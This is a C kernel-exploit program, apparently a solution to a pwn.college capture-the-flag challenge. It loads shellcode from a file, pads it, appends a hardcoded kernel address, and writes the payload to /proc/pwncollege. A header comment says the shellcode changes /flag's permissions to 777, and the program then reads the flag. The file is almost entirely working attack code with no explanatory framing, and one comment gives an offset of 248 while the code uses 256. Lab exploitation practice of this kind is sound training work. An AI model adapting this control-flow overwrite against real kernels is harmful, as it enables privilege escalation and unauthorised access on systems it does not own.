/*

shellcode.bin
'''
/bin/chmod 777 /flag
'''

*/


#include <stdio.h>
#include <stdlib.h>
#include <fcntl.h>
#include <unistd.h>
#include <string.h>

#define MAX_SHELLCODE_SIZE 256
#define ADDR_SIZE 8
#define TOTAL_SIZE (MAX_SHELLCODE_SIZE + ADDR_SIZE)

void fatal(const char *msg) {
    perror(msg);
    exit(EXIT_FAILURE);
}

int main() {
    unsigned char payload[TOTAL_SIZE] = {0}; // Initialize all zeros
    int fd;
    ssize_t bytes_read;
    size_t shellcode_size;

    // 1. Determine shellcode size and read it
    if ((fd = open("shellcode.bin", O_RDONLY)) < 0)
        fatal("[-] open(shellcode.bin)");

    shellcode_size = lseek(fd, 0, SEEK_END);
    lseek(fd, 0, SEEK_SET);

    if (shellcode_size > MAX_SHELLCODE_SIZE) {
        fprintf(stderr, "[-] Shellcode too large (max %d, got %zu)\n", 
                MAX_SHELLCODE_SIZE, shellcode_size);
        close(fd);
        exit(EXIT_FAILURE);
    }

    if ((bytes_read = read(fd, payload, shellcode_size)) != shellcode_size) {
        close(fd);
        fatal("[-] read(shellcode)");
    }
    close(fd);

    // 2. Set target address at offset 248 (after padding)
    void *target_addr = (void *)0xffffffff81089b30; // Replace with your address
    memcpy(payload + MAX_SHELLCODE_SIZE, &target_addr, ADDR_SIZE);

    // Debug output
    printf("[+] Payload composition:\n");
    printf("  Shellcode: %zu bytes\n", shellcode_size);
    printf("  Padding:   %zu bytes\n", MAX_SHELLCODE_SIZE - shellcode_size);
    printf("  Address:   0x%016llx\n", (unsigned long long)target_addr);
    printf("  Total:     %d bytes\n", TOTAL_SIZE);

    // 3. Send payload
    if ((fd = open("/proc/pwncollege", O_WRONLY)) < 0)
        fatal("[-] open(/proc/pwncollege)");

    if (write(fd, payload, TOTAL_SIZE) != TOTAL_SIZE)
        fatal("[-] write()");
    close(fd);

    printf("[+] Payload sent successfully!\n");
    printf("[+] Change the permission of /flag\n");
    system("cat /flag");

    return 0;
}
